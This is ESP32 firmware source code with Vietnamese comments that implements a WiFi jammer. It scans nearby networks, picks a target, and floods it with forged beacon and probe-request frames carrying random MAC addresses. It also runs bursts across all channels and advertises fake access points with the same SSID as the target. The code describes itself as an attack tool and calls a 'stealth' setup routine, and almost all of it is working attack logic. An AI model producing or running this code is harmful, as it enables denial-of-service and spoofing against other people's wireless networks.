#include "wifi_manager.h"
#include <WiFi.h>
#include <esp_wifi.h>

int networkCount = 0;
extern int currentChannel;

// ✅ THÊM: Global control variables
bool isJamming = false;
bool stopJamming = false;
String currentTarget = "";
int currentTargetIndex = -1;
unsigned long jammingStartTime = 0;

// Beacon frame template (ESP32 hỗ trợ)
uint8_t beaconPacket[109] = {
  0x80, 0x00,                         // Frame Control: Beacon
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (will be randomized)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (will be randomized)
  0x00, 0x00,                         // Sequence Control
  // Beacon frame body
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval
  0x01, 0x04,                         // Capability info
  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, // SSID parameter set
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported rates
  0x03, 0x01, 0x06,                   // DS Parameter set, channel 6
  0x05, 0x04, 0x00, 0x01, 0x00, 0x00, // TIM element
};

// Probe request flooding (ESP32 hỗ trợ)
uint8_t probePacket[68] = {
  0x40, 0x00,                         // Frame Control: Probe Request
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (will be randomized)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: broadcast
  0x00, 0x00,                         // Sequence Control
  // Probe request body
  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, // SSID
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported rates
};

void initWiFiManager() {
  Serial.println("🔧 WiFi Jammer initialized");
  esp_wifi_set_promiscuous(true);
  Serial.println("✅ Ready for continuous jamming");
}

void scanNetworks() {
  Serial.println("🔍 Scanning for networks...");
  WiFi.mode(WIFI_STA);
  networkCount = WiFi.scanNetworks();
  WiFi.mode(WIFI_AP);
  Serial.printf("📡 Found %d networks\n", networkCount);
}

int getNetworkCount() { return networkCount; }
String getNetworkSSID(int index) { return (index < networkCount) ? WiFi.SSID(index) : ""; }
int getNetworkRSSI(int index) { return (index < networkCount) ? WiFi.RSSI(index) : 0; }
int getNetworkEncryption(int index) { return (index < networkCount) ? WiFi.encryptionType(index) : 0; }

// ✅ THÊM: Hàm kiểm tra trạng thái jamming
bool isCurrentlyJamming() {
  return isJamming;
}

String getJammingStatus() {
  if (!isJamming) {
    return "Stopped";
  }
  
  unsigned long elapsed = (millis() - jammingStartTime) / 1000;
  return "Active - Target: " + currentTarget + " - Duration: " + String(elapsed) + "s";
}

// ✅ THÊM: Hàm dừng jamming
void stopJammingAttack() {
  if (isJamming) {
    stopJamming = true;
    Serial.println("🛑 Stop command received, ending jamming...");
  }
}

// ✅ SỬA: Hàm jamming liên tục
void sendDeauthPacket(String targetSSID, int targetIndex) {
  if (isJamming) {
    Serial.println("⚠️ Already jamming! Stop current attack first.");
    return;
  }
  
  if (targetIndex >= networkCount || targetIndex < 0) {
    Serial.println("❌ Invalid target index");
    return;
  }
  
  // Get target info
  WiFi.mode(WIFI_STA);
  WiFi.scanNetworks();
  
  uint8_t* bssid = WiFi.BSSID(targetIndex);
  if (bssid == nullptr) {
    Serial.println("❌ Cannot get BSSID");
    WiFi.mode(WIFI_AP);
    return;
  }
  
  int targetChannel = WiFi.channel(targetIndex);
  
  // Set jamming state
  isJamming = true;
  stopJamming = false;
  currentTarget = targetSSID;
  currentTargetIndex = targetIndex;
  jammingStartTime = millis();
  
  Serial.printf("🎯 Target: %s\n", targetSSID.c_str());
  Serial.printf("📍 BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  Serial.printf("📻 Channel: %d\n", targetChannel);
  
  // Switch to target channel
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  
  Serial.println("🔥 Starting MAXIMUM INTENSITY WiFi Jamming...");
  Serial.println("⚡ Using all available techniques");
  
  int waveCount = 0;
  
  while (!stopJamming && isJamming) {
    waveCount++;
    
    // Status update every 3 seconds (more frequent)
    if (waveCount % 300 == 0) {
      unsigned long elapsed = (millis() - jammingStartTime) / 1000;
      Serial.printf("🔥 INTENSE jamming - Wave %d - Duration: %lus\n", waveCount/100, elapsed);
    }
    
    // ✅ TECHNIQUE 1: MASSIVE Beacon Flooding
    for (int i = 0; i < 100; i++) { // Tăng từ 20 lên 100
      uint8_t fakeBSSID[6];
      for (int j = 0; j < 6; j++) {
        fakeBSSID[j] = random(0, 255);
      }
      fakeBSSID[0] = (fakeBSSID[0] & 0xFE) | 0x02;
      
      memcpy(&beaconPacket[10], fakeBSSID, 6);
      memcpy(&beaconPacket[16], fakeBSSID, 6);
      
      // Use target SSID to confuse devices
      if (targetSSID.length() <= 32) {
        beaconPacket[37] = targetSSID.length();
        memcpy(&beaconPacket[38], targetSSID.c_str(), targetSSID.length());
      }
      
      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
      delayMicroseconds(10); // Giảm delay để tăng tần suất
    }
    
    // ✅ TECHNIQUE 2: EXTREME Probe Request Flooding  
    for (int i = 0; i < 200; i++) { // Tăng từ 50 lên 200
      uint8_t fakeClient[6];
      for (int j = 0; j < 6; j++) {
        fakeClient[j] = random(0, 255);
      }
      fakeClient[0] = (fakeClient[0] & 0xFE) | 0x02;
      
      memcpy(&probePacket[10], fakeClient, 6);
      
      // Target specific SSID more frequently
      if (targetSSID.length() <= 32) {
        probePacket[26] = targetSSID.length();
        memcpy(&probePacket[27], targetSSID.c_str(), targetSSID.length());
      }
      
      esp_wifi_80211_tx(WIFI_IF_STA, probePacket, sizeof(probePacket), false);
      delayMicroseconds(5); // Cực kỳ nhanh
    }
    
    // ✅ TECHNIQUE 3: Multi-Channel Chaos
    if (waveCount % 20 == 0) { // Thường xuyên hơn
      Serial.println("🌪️ Multi-channel chaos mode");
      
      // Attack trên tất cả channels
      for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(5);
        
        // Massive burst trên mỗi channel
        for (int i = 0; i < 50; i++) {
          // Random beacon
          uint8_t chaosBSSID[6];
          for (int j = 0; j < 6; j++) {
            chaosBSSID[j] = random(0, 255);
          }
          chaosBSSID[0] = (chaosBSSID[0] & 0xFE) | 0x02;
          
          memcpy(&beaconPacket[10], chaosBSSID, 6);
          memcpy(&beaconPacket[16], chaosBSSID, 6);
          beaconPacket[64] = ch; // Set channel
          
          esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
          delayMicroseconds(20);
        }
      }
      
      // Return to target channel
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
      delay(10);
    }
    
    // ✅ TECHNIQUE 4: Fake AP with same SSID
    if (waveCount % 50 == 0) {
      Serial.println("🎭 Fake AP injection");
      
      // Create fake AP với cùng SSID nhưng khác BSSID
      for (int i = 0; i < 20; i++) {
        uint8_t fakeBSSID[6];
        for (int j = 0; j < 6; j++) {
          fakeBSSID[j] = random(0, 255);
        }
        fakeBSSID[0] = (fakeBSSID[0] & 0xFE) | 0x02;
        
        memcpy(&beaconPacket[10], fakeBSSID, 6);
        memcpy(&beaconPacket[16], fakeBSSID, 6);
        
        // Use EXACT same SSID as target
        beaconPacket[37] = targetSSID.length();
        memcpy(&beaconPacket[38], targetSSID.c_str(), targetSSID.length());
        
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
        delayMicroseconds(100);
      }
    }
    
    // Minimal pause to prevent watchdog
    delayMicroseconds(50); // Cực kỳ ngắn
    
    // Safety auto-stop
    if (millis() - jammingStartTime > 1800000) { // 30 minutes
      Serial.println("⏰ Auto-stop after 30 minutes");
      stopJamming = true;
    }
  }
  
  // Cleanup
  isJamming = false;
  stopJamming = false;
  unsigned long totalTime = (millis() - jammingStartTime) / 1000;
  
  Serial.println("✅ Continuous jamming stopped!");
  Serial.printf("📊 Total duration: %lu seconds\n", totalTime);
  Serial.printf("📊 Total waves sent: ~%d\n", waveCount/100);
  Serial.println("🔄 Restoring AP mode...");
  
  // Restore AP mode
  delay(500);
  WiFi.mode(WIFI_AP);
  
  extern void setupStealth();
  setupStealth();
  
  Serial.println("♻️ AP mode restored - Ready for next attack");
}